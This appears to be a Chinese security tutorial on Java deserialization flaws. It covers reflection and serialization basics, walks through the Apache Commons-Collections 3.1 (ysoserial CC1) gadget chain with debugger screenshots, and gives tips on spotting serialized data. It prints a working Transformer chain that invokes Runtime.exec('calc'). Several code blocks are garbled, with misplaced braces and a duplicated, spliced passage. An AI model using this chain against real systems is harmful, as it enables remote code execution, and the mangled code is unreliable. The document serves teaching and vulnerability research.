# 0×01：序列化基本概念

  * 序列化：将对象写入IO流中
  * 反序列化：从IO流中恢复对象
  * 意义：序列化机制允许将实现序列化的Java对象转换位字节序列，这些字节序列可以保存在磁盘上，或通过网络传输，以达到以后恢复成原来的对象。序列化机制使得对象可以脱离程序的运行而独立存在。

# 0×02：Java中的反射机制

1.反射机制的作用: 通过java语言中的反射机制可以操作字节码文件(可以读和修改字节码文件)

2\. 反射机制的相关类在哪个包下java.lang.reflect.*;

3\. 反射机制的相关类有哪些：

java.lang.Class 代表字节码文件，代表整个类

java.lang.reflect.Method 代表字节码中的方法字节码，代表类中的方法  
java.lang.reflect.Constructor 代表字节码中的构造方法字节码，代表类中的构造方法java.lang.reflect.Field
代表字节码中的属性字节码，代表类中的属性。

我们先看最主要的部分——执行系统命令

    
    
    public class N0Tai1{
        public static void main(String[] args) throws Exception{
    } }
    Runtime calc = Runtime.getRuntime(); calc.exec("calc"); //Runtime.getRuntime().calc.exec("calc")

相应的反射代码如下：

    
    
    public class N0Tai1{
        public static void main(String[] args) throws Exception{
    } }
    Class c = Class.forName("java.lang.Runtime"); //c代表Runtime.class字节码文件,c代表Runtime类型
    Object obj = c.getMethod("getRuntime", null).invoke(c,null);
    /*
    * 通过getMethod对getRuntime这个方法进行实例化
    * getRuntime并不需要传参,所以传参类型为null,后面的invoke实现getRuntime
    * */
    String[] n0tai1 = {"calc.exe"}; c.getMethod("exec",String.class).invoke(obj,n0tai1);
    /*
    * getMethod对exec这个方法进行实例化
    * exec需要传一个String类型的字符串或者String类型的数组,然后invoke实现exec方法 * */

# 0×03：序列化的实现方式

###  **序列化概述**

如果需要将某个对象保存到磁盘上或者通过网络传输，那么这个类应该实现 Serializable 接口或者Externalizable接口之一。

使用到JDK中关键类 ：

ObjectOutputStream (对象输出流) 和 ObjectInputStream (对象输入流)ObjectOutputStream
类中:通过使用 writeObject (Object object) 方法，将对象以二进制格式进行写入。

ObjectInputStream类中:

通过使用 readObject() 方法，从输入流中读取二进制流，转换成对象。

Transient关键字序列化的时候不会序列化Transient关键字修饰的变量，这个关键字不能修饰类和方法Static **。**

静态变量也不会被序列化

 **serialVersionUID**

这里是指序列化的版本号，版本不一致会导致抛出错误，并且拒绝载入序列化与反序列化样例:

    
    
    //Person.java
    package com.n0tai1.java.serialize;
    import java.io.FileOutputStream;
    import java.io.IOException;
    import java.io.ObjectOutputStream; import com.n0tai1.java.serialize.Student;
    public class Person{
        public static void main(String[] args) throws IOException {
    Student s = new Student(19,"ZAAAA"); System.out.println(s.Students()); System.out.println(s.toString()); ObjectOutputStream oos = new ObjectOutputStream(new
    FileOutputStream("I:\\project\\Java\\JavaSePro\\src\\flag.txt")); oos.writeObject(s);
    oos.flush();
    oos.close(); }
    }
    
    
    //Student.java
    package com.n0tai1.java.serialize;
    import java.io.Serializable;
    public class Student implements Serializable {
        private static final long serialVersionUID = 5407396955208161433L;
        private int age;
         private transient String name;
        public Student(int age, String name){
    this.age = age;
    this.name = name; }
    public String Students(){
    return "姓名: "+ this.name + " 年龄: " + this.age;
    }
    @Override
    public String toString() {
    return "姓名: "+ this.name + " 年龄: " + this.age;
    } }
    
    
    //unserialize.java
    package com.n0tai1.java.serialize;
    import java.io.FileInputStream;
    import java.io.IOException;
    import java.io.ObjectInputStream;
    import com.n0tai1.java.serialize.Student;
    public class unserialize{
        public static void main(String[] args) throws IOException,
    ClassNotFoundException 
    {
            ObjectInputStream ois = new ObjectInputStream(new
    FileInputStream("I:\\project\\Java\\JavaSePro\\src\\flag.txt")); Object obj = ois.readObject();
    System.out.println(obj);
    ois.close(); }
    }
    现在已经知道如何序列化和反序列化了，我们把刚刚写的弹计算器代码序列化处理一下package com.n0tai1.java.serialize;
    import com.n0tai1.java.serialize.ExecTest; import java.io.FileOutputStream;
    import java.io.ObjectOutputStream;
    public class Serializable{
        public static void main(String[] args) throws Exception {
    ExecTest s = new ExecTest();
    s.ExecTest();
    ObjectOutputStream oos = new ObjectOutputStream(new
    FileOutputStream("I:\\project\\Java\\JavaSePro\\src\\serialize.txt")); oos.writeObject(s);
    oos.flush();
    oos.close(); }
    }private transient String name;
        public Student(int age, String name){
    this.age = age;
    this.name = name; }
    public String Students(){
    return "姓名: "+ this.name + " 年龄: " + this.age;
    }
    @Override
    public String toString() {
    return "姓名: "+ this.name + " 年龄: " + this.age;
    } }
    
    
    //unserialize.java
    package com.n0tai1.java.serialize;
    import java.io.FileInputStream;
    import java.io.IOException;
    import java.io.ObjectInputStream;
    import com.n0tai1.java.serialize.Student;
    public class unserialize{
        public static void main(String[] args) throws IOException,
    ClassNotFoundException {
            ObjectInputStream ois = new ObjectInputStream(new
    FileInputStream("I:\\project\\Java\\JavaSePro\\src\\flag.txt")); Object obj = ois.readObject();
    System.out.println(obj);
    ois.close(); }
    }

现在已经知道如何序列化和反序列化了，我们把刚刚写的弹计算器代码序列化处理一下

    
    
    package com.n0tai1.java.serialize;
    import com.n0tai1.java.serialize.ExecTest; import java.io.FileOutputStream;
    import java.io.ObjectOutputStream;
    public class Serializable{
        public static void main(String[] args) throws Exception {
    ExecTest s = new ExecTest();
    s.ExecTest();
    ObjectOutputStream oos = new ObjectOutputStream(new
    FileOutputStream("I:\\project\\Java\\JavaSePro\\src\\serialize.txt")); oos.writeObject(s);
    oos.flush();
    oos.close(); }
    }
    
    
    package com.n0tai1.java.serialize;
    import java.io.Serializable;
    public class ExecTest implements Serializable {
        public void ExecTest() throws Exception{
    } }
    Class c = Class.forName("java.lang.Runtime");
    Object obj = c.getMethod("getRuntime", null).invoke(null); String[] n0tai1 = {"calc.exe"}; c.getMethod("exec",String.class).invoke(obj,n0tai1);
    
    
    //unserialize.java
    package com.n0tai1.java.serialize;
    import java.io.FileInputStream;
    import java.io.IOException;
    import java.io.ObjectInputStream;
    import com.n0tai1.java.serialize.ExecTest;
    public class unserialize{
        public static void main(String[] args) throws IOException,
    ClassNotFoundException {
            ObjectInputStream ois = new ObjectInputStream(new
    FileInputStream("I:\\project\\Java\\JavaSePro\\src\\serialize.txt")); Object obj = ois.readObject();
    System.out.println(obj);
    ois.close(); }
    }

但是这样测试后发现，反序列操作后，不能弹出计算器吗，因为Runtime类并没有实现 Serializable接口

###  **commons-collections3.1源码分析**

漏洞组件:https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1

参考链接:https://security.tencent.com/index.php/blog/msg/97

我们直接入正题

![v2-d9ddc2d8f42c8d194a39fd40e6884fdd_720w.png](https://image.3001.net/images/20210610/1623293546_60c17e6a39c38792d1f54.png!small)

我们可以通过

    
    
    Map tansformedMap = TransformedMap.decorate(map,keyTransformer,valueTransformer)

来获得一个TransformedMap类的实例进而调用到TransformedMap的构造方法

![v2-5c4e4520fdbb54759d17afe4de6deee4_720w.png](https://image.3001.net/images/20210610/1623293546_60c17e6ab726a639ad2c4.png!small)

这里会调用到super(map)，会调用到基类的有参构造

![v2-c88f267b3e37b715536ffbc99889bd3e_720w.png](https://image.3001.net/images/20210610/1623293547_60c17e6b132c3632b745a.png!small)

继续调用基类有参构造

![v2-0d06f36589fc5341c00a084455345d78_720w.png](https://image.3001.net/images/20210610/1623293547_60c17e6b7cc52702a950e.png!small)

TransformedMap.decorate会对map类的数据结构进行转化

    
    
    TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。
    
    
    第一个参数为待转化的Map对象
    第二个参数为Map对象内的key要经过的转化方法(可为单个方法，也可为链，也可为空)
    第三个参数为Map对象内的value要经过的转化方法

我们看今天的第一个主角ChainedTransformer.class，我们可以创建一个Transformer类型的数组，构造出ChainedTransformer，当触发的时候ChainedTransformer可以将闲散的数据组合

![v2-4b6d0fbe75748f5e6f9737bd3b27cd4f_720w.png](https://image.3001.net/images/20210610/1623293547_60c17e6be31d4e494b5ea.png!small)

我们看今天的第二个主角InvokerTransformer.class，我们可以给创建一个Transformer类型的数组，
然后对InvokerTransformer进行实例化

![v2-15a5fac9a825450cfa39892c2e67ae23_720w.png](https://image.3001.net/images/20210610/1623293548_60c17e6c475fc084f71e4.png!small)

可以看到：

InvokerTransformer的transform中出现了 getMethod().invoke() 这种形式的代码，我们
如果可以控制传参，就可以RCE

那我们如何调用到InvokerTransformer和ChainedTransformer的transform呢?

这里我们需要用到：

AbstractInputCheckedMapDecorator下MapEntry下的setValue

![v2-af406670b86f66107ba9d9125e066a97_720w.png](https://image.3001.net/images/20210610/1623293548_60c17e6cbd45d47507804.png!small)

![v2-679ac7a27890509b04e1f937513c48be_720w.png](https://image.3001.net/images/20210610/1623293549_60c17e6d32cbc6b6169b2.png!small)

![v2-076513329320bbdeceb61c77d76fc317_720w.png](https://image.3001.net/images/20210610/1623293549_60c17e6d85ea06f436735.png!small)

只要让iTransformers[i]为InvokerTransformer这个类的对象就可以调用到InvokerTransformer的transform

那我们如何触发呢? 在进行反序列化的时候我们会调用ObjectInputStream类的readObject()方法，如果反序列化类被重写

readObject()，那在反序列化的时候Java会优先调用重写的readObject()方法，这样就有了入口点

###  **Payload分析**

正文之前，在这之前说下我对getMethod和invoke这两个方法的理解

 **getMethod**

返回一个Method对象，getMethod获取的是某个类下的某个方法，第一个参数是方法名，第二个参数
要看这个方法需要什么参数，如果需要字符串，那我们就写String.class，如果不需要传参，则用null即可

 **invoke**

调用包装在当前Method对象中的方法
，第一个参数是obj，也就是实例化的对象，第二个参数是方法(这里的方法是指getMethod第一个参数对应的方法)需要的参数

 **分析**

我们直接拿ysoserial中的cc1的链子来对照着写一个(这里的代码借鉴了一位大佬的...但是网址忘记了....)

    
    
    import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap;
    import org.apache.commons.collections.Transformer; import java.util.HashMap;
    import java.util.Map;
    public class test{
        public static void main(String[] args)
        {
    Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[] { String.class,
    Class[].class }, new Object[] { "getRuntime", new Class[0] }),
    new InvokerTransformer("invoke", new Class[] { Object.class,
    Object[].class }, new Object[] { null, new Object[0] }),
    new InvokerTransformer("exec", new Class[] { String.class }, new
    Object[] { "calc" }) };
            Transformer transformerChain = new ChainedTransformer(transformers);
    } }
    Map innermap = new HashMap();
    innermap.put("name", "hello");
    Map outmap = TransformedMap.decorate(innermap, null, transformerChain); Map.Entry elEntry = ( Map.Entry ) outmap.entrySet().iterator().next(); elEntry.setValue("hahah");

我们直接IDEA拉出来打个断点开始疯狂debug

![v2-ea76e42026f7bbf76edfc9e7d9155309_720w.png](https://image.3001.net/images/20210610/1623293550_60c17e6e1a9dee5f68946.png!small)

先跟这个实例化对象，看看发生了什么大事件

 **new ConstantTransformer()部分**

![v2-57b44397322e60d40d2fb2718fbf1d61_720w.png](https://image.3001.net/images/20210610/1623293550_60c17e6e85ff8d594e157.png!small)

这里传进来一个Runtime.class字节码文件，然后赋值给了被private和final修饰的iConstant变量，我们看一下这个变量

![v2-2404512fe2b60521ba317d13bb69b79f_720w.png](https://image.3001.net/images/20210610/1623293550_60c17e6ee7075d1899ff2.png!small)

 **new InvokerTransformer()部分**

继续往下跟，跟到InvokerTranformer类的构造方法

![v2-54445ce96e4c736e8a0095d1df72fcd9_720w.png](https://image.3001.net/images/20210610/1623294373_60c181a519407dbc19e99.png!small)

![v2-beffcffdfdb93859fbb1f620d858fea0_720w.png](https://image.3001.net/images/20210610/1623293551_60c17e6f529726e914d88.png!small)

第一个参数是getMethod的作用是获取对象的方法

第二个参数是两个字节码文件String.class和Class.class

第三个参数是Runtime.class下的静态方法

![v2-fb32071a5bbdf2da01df9a5fb822b5fd_720w.png](https://image.3001.net/images/20210610/1623293551_60c17e6fcadd53a2a7297.png!small)

继续往下debug，依然是InvokerTransformer

![v2-cee0582a1086ac26308c6bd50d4d835d_720w.png](https://image.3001.net/images/20210610/1623293552_60c17e702410684f2254d.png!small)

第一个参数是invoke的作用是让这个方法执行

第二个参数是两个字节码文件Object.class和Object.class

第三个参数是一个Object类型的数组，为空

![v2-9a2ce4ba830de6b527d219a01b6c78c3_720w.png](https://image.3001.net/images/20210610/1623293552_60c17e70995d202f2bf76.png!small)

继续往下跟

![v2-d21ace7fde8721b8aa52d779feb6477f_720w.png](https://image.3001.net/images/20210610/1623293553_60c17e7109da8b3f88fef.png!small)

第一个参数是exec的作用是执行系统命令，这个方法是Runtime.class下的

第二个参数是字节码文件String.class

第三个参数是Object类型的数组，里面只有一个元素calc(这里就是调用的地方)

 **new ChainedTransformer部分**

![v2-406271900248f23cb81b1499c10b79ad_720w.png](https://image.3001.net/images/20210610/1623293553_60c17e7156d3e0e6b9e19.png!small)

这里把这个有四个对象的数组传入了ChainedTransformer中的有参构造方法处理

![v2-263647288f90b2b39baee1b4b39cbb4c_720w.png](https://image.3001.net/images/20210610/1623293553_60c17e71cf50c8709fa69.png!small)

赋值给了iTransformers

 **new HashMap()部分**

![v2-8fae5c9ae1abc456c05b1b2618f8b6b8_720w.png](https://image.3001.net/images/20210610/1623293554_60c17e725f84d56bf56fc.png!small)

这里定义了一个底层为哈希表的数组，然后用put方法添加了key和value

 **TransformedMap.decorate静态方法部分**

![v2-4630cf82dcb5dba9430c36a28baadb91_720w.png](https://image.3001.net/images/20210610/1623293555_60c17e731b6b65030d643.png!small)

在返回值中new了一个TransformedMap，调用了自身的有参构造方法

第一个参数接受的是我们put方法写入map数组的key和value

第二个参数接受的是null

第三个参数接受的是transformerChain，也就是4个对象组成的数组

![v2-77a09db0b931a335a3c802758fa53b07_720w.png](https://image.3001.net/images/20210610/1623293555_60c17e7378b3632ad97c0.png!small)

调用了父类的构造方法，并且传了一个map

**![v2-b02259eeefce68ae987a655fa57cf9da_720w.png](https://image.3001.net/images/20210610/1623293555_60c17e73d48d0ed7d3b4f.png!small)**

继续调用父类的构造方法，仍传的是map

![v2-8e0d24d8d1b3ffc68d5e9651f4150eb8_720w.png](https://image.3001.net/images/20210610/1623293556_60c17e743ecaee6a90352.png!small)

继续往下

![v2-4c953e4e925bf88f6f8c62bb15765e67_720w.png](https://image.3001.net/images/20210610/1623293556_60c17e749f16e3e5aee11.png!small)

###  **Map.Entry学习和详解**

将output这个map类型的数组强转到Map.Entry类型的数组中，并且用next获取一组key和value

然后后面调用setValue

![v2-a0162c40dbe5d7469ca7fc3bed692dce_720w.png](https://image.3001.net/images/20210610/1623293557_60c17e751cba9481863f3.png!small)

调用了checkSetValue

![v2-4fcdcab2a636713a03097618f909dbd5_720w.png](https://image.3001.net/images/20210610/1623293557_60c17e756c47e788d8601.png!small)

调用transform

![v2-34e8d458d3e0c8e75a4dc491f12e4e42_720w.png](https://image.3001.net/images/20210610/1623293557_60c17e75ca3ee27cb717f.png!small)

这里的就开始遍历我们之前写入的4个实例化对象，我们来看最终触发漏洞的关键地方

第一次遍历

![v2-a7a9c57d69874397b4422e5e2a11d892_720w.png](https://image.3001.net/images/20210610/1623293558_60c17e763ec7588de3d7a.png!small)

返回的是Runtime.class

第二次遍历

![v2-3a5db73904f4a87dd8000d274b028721_720w.png](https://image.3001.net/images/20210610/1623293558_60c17e76960e660ec6eb9.png!small)

给cls了一个Runtime.class字节码文件，cls现在是Runtime类型，然后getMethod获得一个方法对象，
方法名为getMethod，指定的传参类型为String和Object，之后调用invoke实现了getMethod方法并且传参是getRuntime

    
    
    Class cls = Class.forName("java.lang.Runtime")
    Method method = cls.getMethod("getMethod",new Class[] { String.class, Class[].class }).invoke(cls,"getRuntime");
    //等价于
    cls.getMethod("getRuntime",null).invoke(cls.null);
    //等价于
    cls.getMethod("getRuntime",null);

第三次遍历

![v2-4e67401388679ac6c8529e79d6c9b43e_720w.png](https://image.3001.net/images/20210610/1623293558_60c17e76f1547e727e9da.png!small)

getMethod获得一个方法对象，方法名为invoke，指定的传参类型为Object，然后调用invoke方法实现了invoke方法，传参为null

    
    
    cls.getMethod("invoke",new Class[] { Object.class, Object[].class }).invoke(cls,null);
    //等价于
    cls.invoke(null,null);

第四次遍历

![v2-13f89ddf460ac26a49aa9dfc1aaf9f8f_720w.png](https://image.3001.net/images/20210610/1623293559_60c17e77666bb1317cb66.png!small)

getMethod获得一个方法对象，方法名为exec，指定传参类型为String，然后通过invoke方法实现了exec方法，传参为calc

    
    
    cls.getMethod("exec",new Class[] { String.class }).invoke(cls,'calc');//等价于
    cls.exec("calc");

 **总结一下思路：**

InvokerTransformer为漏洞触发处ChianedTransformer为一个容器,作用是帮我们把InvokerTransformer组成一个有序的数组,让其有序遍历

Transformer为一个接口类,这里写法单纯是多态而已....

1.利用setValue触发  
AbstractInputCheckedMapDecorator下的setValue进而触发InvokerTransformer的transform这个漏洞触发点

2.第二次遍历生成的相当于一个未执行的Runtime.getRuntime(),第三次遍历相当于将Runtime.getRuntime()执行,第四次循环调用了runtime下的方法exec

# 0×04：如何发现Java反序列化漏洞

  *  **白盒**

可以检索源码中对反序列化函数的调用，例如:

    
    
    ObjectInputStream.readObject
    ObjectInputStream.readUnshared
    XMLDecoder.readObject
    Yaml.load
    XStream.fromXML
    ObjectMapper.readValue
    JSON.parseObject

确定输入点后，检查class path中是否有危险库，例如上文分析的Apache Commons
Collections，若有危险库直接用ysoserial梭

弱无危险库，则检查是否有涉及代码执行的部分，查看是否有代码编写上的bug

  *  **黑盒**

我们可以通过抓包这种手段来检测是否有可控输入点，序列化数据通常以ACED开头，之后两个字节为版本号，一般情况是0005，某些情况下可能是更高的数字

如果不确定字符串是否为序列化数据，我们可以利用大牛写好的工具SerializationDumper来进行检测，用法如下:

    
    
    java -jar SerializationDumper-v1.0.jar aced000573720008456d706c6f796565eae11e5afcd287c50200024c00086964656e746966797400 124c6a6176612f6c616e672f537472696e673b4c00046e616d6571007e0001787074000d47656e65 72616c207374616666740009e59198e5b7a5e794b2﻿

